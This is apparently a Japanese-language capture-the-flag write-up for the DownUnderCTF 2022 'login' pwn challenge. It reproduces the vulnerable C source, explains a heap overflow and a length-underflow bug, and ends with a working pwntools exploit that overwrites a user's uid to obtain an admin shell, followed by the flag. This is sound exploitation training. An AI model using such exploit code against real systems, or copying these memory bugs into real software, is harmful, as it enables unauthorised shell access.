# DownUnderCTF 2022 `login [pwn]` writeup

## 問題
Free shell for admins!

`nc 2022.ductf.dev 30025`

バイナリファイルとソースコードが提供される。

```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>


#define NUM_USERS 0x8
#define USERNAME_LEN 0x18
#define ADMIN_UID 0x1337

typedef struct {
    int uid;
    char username[USERNAME_LEN];
} *user_t;

int curr_user_id = ADMIN_UID;
user_t users[NUM_USERS];


void init() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void read_n_delimited(char* buf, size_t n, char delimiter) {
    char c;
    size_t i = 0;
    while(i <= n - 1) {
        if(read(0, &c, 1) != 1) {
            break;
        }

        if(c == delimiter) {
            break;
        }

        buf[i++] = c;
    }
    buf[i] = '\0';
}

int read_int() {
    char buf[8];
    read_n_delimited(buf, 8, '\n');
    return atoi(buf);
}


void menu() {
    puts("1. Add user");
    puts("2. Login");
    printf("> ");
}

void add_user() {
    user_t user = (user_t) malloc(sizeof(user_t));
    users[curr_user_id++ - ADMIN_UID] = user;

    printf("Username length: ");
    size_t len = read_int();
    if(len > USERNAME_LEN) {
        puts("Length too large!");
        exit(1);
    }

    if(!user->uid) {
        user->uid = curr_user_id;
    }
    printf("Username: ");
    read_n_delimited(user->username, len, '\n');
}

void login() {
    int found = 0;

    char username[USERNAME_LEN];
    printf("Username: ");
    read_n_delimited(username, USERNAME_LEN, '\n');
    for(int i = 0; i < NUM_USERS; i++) {
        if(users[i] != NULL) {
            if(strncmp(users[i]->username, username, USERNAME_LEN) == 0) {
                found = 1;

                if(users[i]->uid == 0x1337) {
                    system("/bin/sh");
                } else {
                    printf("Successfully logged in! uid: 0x%x\n", users[i]->uid);
                }
            }
        }
    }

    if(!found) {
        puts("User not found");
    }
}


int main() {
    init();

    while(1) {
        menu();
        int choice = read_int();
        if(choice == 1) {
            add_user();
        } else if(choice == 2) {
            login();
        } else {
            exit(1);
        }
    }
}

```

## 解法
ユーザの追加 (8人まで)と追加したユーザでのログイン処理が実行できるプログラム。
ログインしたユーザのUIDが0x1337番ならシェルを取れる。
しかしながらUIDは0x1338, 0x1339, ... の順に割り当てれるので、普通にやっていてはadmin権限でのログインは果たせない。

まずはセキュリティ機構を確認。

[*] '/home/caffeine/ctf/ductf22/pwn/login/login'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

フルアーマーです。
とは言えプログラムに明白な欠陥があることにすぐ気が付くと思います。

ユーザを新たに追加するとき、プログラムはuser_t構造体のサイズ分mallocでメモリを確保している。
user_t構造体はint型のuidとusernameを格納するためのchar型のbufで構成されている構造体へのポインタ型として定義されている。
**構造体の実体ではありません。**

x64だとポインタ型のサイズは0x8バイトなので、切り出されるチャンクは最小サイズの0x20バイト。
この領域にuidとusernameを無理矢理格納しようとしてheap overflowが生じる。
具体的には、int型4バイト + usernameの最大サイズが0x18と定義されているので、4バイト分のheap overflowでtop chankのサイズを書き換えることができる。

最初は上述の解析結果からhouse of orangeやhouse of forceのようなものを疑いましたが違いました。反省。

チームメイトが気づいてくれたのだが、read_n_deliminated関数にも脆弱性がある。
この関数は`read_n_deliminated(char *buf, size_t n, char delimiter)`と引数を渡すことで、delimitorが現れる or n-1バイト読み込みNULL終端した上でbufに格納する。
nに0を指定した場合、n-1がオーバーフローを起こして10億バイトくらい読み込んでくれるようになる。

ユーザ追加時に名前の長さを0に指定、heap overflowで続くユーザのチャンクのuidの位置に0x1337を書き込んでやればよい。

## Exploit
admin権限でログインするユーザの名前を、read_n_deliminated関数の脆弱性に一早く気づいてくれたチームメイトの名前にした。
スペシャルサンクスみたいなものです。

```py
from pwn import *
import sys

elf = ELF("./login")

# io = process(elf.path)
io = remote("2022.ductf.dev", 30025)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

def add(len, name):
    io.sendlineafter("> ", b"1")
    io.sendlineafter("length:", len)
    io.sendlineafter("Username: ", name)

def login(name):
    io.sendlineafter("> ", b"2")
    io.sendlineafter("Username: ", name)

payload = b"A" * 20
payload += b"\x51\x0d\x02\x00"
payload += b"\x00" * 4
payload += p64(0x1337)

add(b"0", payload)

add(b"10", b"laika")
login(b"laika")

io.interactive()
```

FLAG: `DUCTF{th3_4uth_1s_s0_bad_1t_d0esnt_ev3n_us3_p4ssw0rds}`